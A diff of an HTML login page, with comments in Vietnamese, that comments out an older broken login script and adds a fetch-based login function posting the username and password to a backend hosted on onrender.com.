@@ -236,7 +236,7 @@
 
 //     </script> -->
     
-<script>
+<!-- <script>
 //   const API_URL = "https://www.protocolmaster.xyz"; // Kiểm tra lại URL chính xác
 
 // async function login() {
@@ -255,32 +255,32 @@
 
 // const text = await response.text();
 // console.log("🔹 Raw Response:", text);
-const API_URL = "https://bluesky-backend-bii5.onrender.com"; // Sử dụng đúng URL backend trên Render
+// const API_URL = "https://bluesky-backend-bii5.onrender.com"; // Sử dụng đúng URL backend trên Render
 
-async function login() {
-    const username = document.querySelector("[name='username']").value;
-    const password = document.querySelector("[name='password']").value;
+// async function login() {
+//     const username = document.querySelector("[name='username']").value;
+//     const password = document.querySelector("[name='password']").value;
 
-    const response = await fetch(`${API_URL}/login`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
-    });
+//     const response = await fetch(`${API_URL}/login`, {
+//         method: "POST",
+//         headers: { "Content-Type": "application/json" },
+//         body: JSON.stringify({ username, password })
+//     });
 
-    console.log("🔹 Status Code:", response.status);
-    console.log("🔹 Response Headers:", response.headers);
+//     console.log("🔹 Status Code:", response.status);
+//     console.log("🔹 Response Headers:", response.headers);
 
-    const result = await response.json();
-    console.log("✅ JSON response:", result);
-}
+//     const result = await response.json();
+//     console.log("✅ JSON response:", result);
+// }
 
-try {
-    const result = JSON.parse(text);
-    console.log("✅ JSON response:", result);
-} catch (error) {
-    console.error("❌ Không thể parse JSON:", error);
-    alert("Lỗi server: Đã nhận phản hồi không hợp lệ!");
-}
+// try {
+//     const result = JSON.parse(text);
+//     console.log("✅ JSON response:", result);
+// } catch (error) {
+//     console.error("❌ Không thể parse JSON:", error);
+//     alert("Lỗi server: Đã nhận phản hồi không hợp lệ!");
+// }
 
         // const response = await fetch(`${API_URL}/login`, {
         //     method: "POST",
@@ -300,12 +300,39 @@ try {
         // } else {
         //     alert("❌ " + result.message);
         // }
-    } catch (error) {
-        alert("⚠ Lỗi kết nối, vui lòng kiểm tra mạng và thử lại!");
-    }
-}
+//     } catch (error) {
+//         alert("⚠ Lỗi kết nối, vui lòng kiểm tra mạng và thử lại!");
+//     }
+// }
 
+// </script> -->
+    
+<script>
+  const API_URL = "https://bluesky-backend-bii5.onrender.com"; // Đúng URL backend
+
+  async function login() {
+      const username = document.querySelector("[name='username']").value;
+      const password = document.querySelector("[name='password']").value;
+
+      try {
+          const response = await fetch(`${API_URL}/login`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ username, password })
+          });
+
+          console.log("🔹 Status Code:", response.status);
+          console.log("🔹 Response Headers:", response.headers);
+
+          const result = await response.json();
+          console.log("✅ JSON response:", result);
+      } catch (error) {
+          console.error("❌ Lỗi đăng nhập:", error);
+          alert("Có lỗi xảy ra, vui lòng thử lại!");
+      }
+  }
 </script>
-    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+
+<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
   </body>
 </html>
